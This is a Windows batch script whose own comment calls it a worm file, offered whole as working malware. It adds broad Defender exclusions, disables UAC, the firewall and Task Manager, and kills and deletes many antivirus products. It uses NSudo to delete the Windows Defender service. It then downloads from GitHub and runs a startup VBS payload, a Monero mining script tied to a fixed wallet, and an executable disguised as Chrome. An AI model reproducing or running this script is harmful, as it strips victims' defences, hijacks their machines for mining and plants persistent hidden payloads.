::DISABLE ALL THREATS TO THE WORM FILE AND
::DISABLE ALL ANTIVIRUSES
PowerShell.exe -command Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force; 
timeout 3
PowerShell.exe -command Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;

echo echo Msgbox"WE'RE IN ",0+64,"YEAH!" > msg1.vbs
start msg1.vbs

PowerShell.exe -command New-Item -Path "HKCU:\Software\Policies\Microsoft\Windows" -Name "Explorer" -force
PowerShell.exe -command New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -PropertyType "DWord" -Value 1
PowerShell.exe -command New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -PropertyType "DWord" -Value 0

 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"

powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

powershell.exe -command "netsh advfirewall set allprofiles state off"

PowerShell.exe -command "Set-ExecutionPolicy Unrestricted"
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘%USERPROFILE%\AppData\Roaming‘
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘%USERPROFILE%\AppData\Roaming\’
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘%USERPROFILE%\‘
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘C:\Windows\*‘
PowerShell.exe -command Add-MpPreference -ExclusionExtension ".bat"
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘%USERPROFILE%‘\AppData\Local\Temp\*’
PowerShell.exe -command Add-MpPreference -ExclusionPath ‘%USERPROFILE%\AppData\Local\Temp\*’
timeout 5
powershell.exe -Command Add-MpPreference -ExclusionPath "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\System32"
powershell.exe -Command Add-MpPreference -ExclusionPath "%APPDATA%"
powershell.exe -Command Add-MpPreference -ExclusionPath "%USERPROFILE%"
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Program Files"
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\System32"
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows"
PowerShell.exe -command Add-MpPreference -ExclusionExtension ".exe"
PowerShell.exe -command Add-MpPreference -ExclusionExtension ".vbs"
PowerShell.exe -command Add-MpPreference -ExclusionExtension ".cmd"

rem Permanently Kill Anti-Virus

net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /F /im av*
tskill /f /im fire*
tskill /F /im anti*

tskill /F /FI spy*
tskill /F /FI bullguard
tskill /A PersFw
tskill /F /FI KAV*
tskill /F /FI ZONEALARM
tskill /F /FI SAFEWEB

tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /F /FI ESAFE
tskill /A cle

tskill /A BLACKICE
taskill /F /FI def*
taskill /F /FI kav
taskill /F /FI kav*
taskill /F /FI avg*
taskill /A ash*

taskill /A aswupdsv
taskill /F /im ewid*
taskill /F /im guard*
taskill /F /im guar*
taskill /A gcasDt*
taskill /A msmp*

taskill /A mcafe*
taskill /A mghtml
taskill /f /im msiexec
taskill /A outpost
taskill /F /FI isafe
taskill /A zap*

taskill /A zauinst
taskill /A upd*
taskill /A zlclien*
taskill /A minilog
taskill /A cc*
taskill /F /im norton*

taskill /F /FI norton au*
taskill /f ccc*
taskill /A npfmn*
taskill /A loge*
taskill /A nisum*
taskill /A issvc
taskill /A tmp*

taskill /F /im tmn*
taskill /F /im pcc*
taskill /F /im cpd*
taskill /F /im pop*
taskill /F /im pav*
Takkill /F /im padmin

taskill /f /im panda*
taskill /F /im avsch*
taskill /F /im sche*
taskill /F /im syman*
taskill /F /im virus*
taskill /F /im realm*

taskill /F /im sweep*
taskill /F /im scan*
taskill /F /im ad-*
taskill /F /im safe*
taskill /F /im avas*
taskill /F /im norm*

tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe

del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat

del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*

del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe

del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nod32\*.exe

del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*

del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe

del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe

del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda software\*.*

timeout 5

taskkill /f /im "QHActiveDefense.exe"
taskkill /f /im "QHSafeMain.exe"
taskkill /f /im "QHSafeTray.exe"
taskkill /f /im "QHWatchddog.exe"
taskkill /f /im "avg.exe"
taskkill /f /im "Avastsvc.exe"
taskkill /f /im "avgToolsvc.exe"
taskkill /f /im "nod32krn.exe"
taskkill /f /im "klpsm.exe"
taskkill /f /im "msedge.exe"
taskkill /f /im "OfficeClickToRun.exe"

TIMEOUT 5

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
 

cd  %temp%

bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

set pop=%systemroot%

NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  

NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  

powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"

powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

powershell.exe -command "netsh advfirewall set allprofiles state off"

cd C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hackerx237/miner/main/avdisabler.vbs -OutFile service.vbs"
start service.vbs

timeout 15

IF EXIST %USERPROFILE%\moneroocean\nssm.exe (goto good)
ELSE (powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/Hackerx237/MoneroOcean/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 47rRDSViApg6CUyxRtzMSyB9usBoL9BZtEjxWfBv4gRDDdy2MmVx5U7c5WZmPqqVJXWYaDPoLDVxJCiUGwbzfEJeHq36kZE; Remove-Item -Force $tempfile")

cd C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hackerx237/Helium/main/Helium.exe -OutFile Chrome."
start Chrome.exe
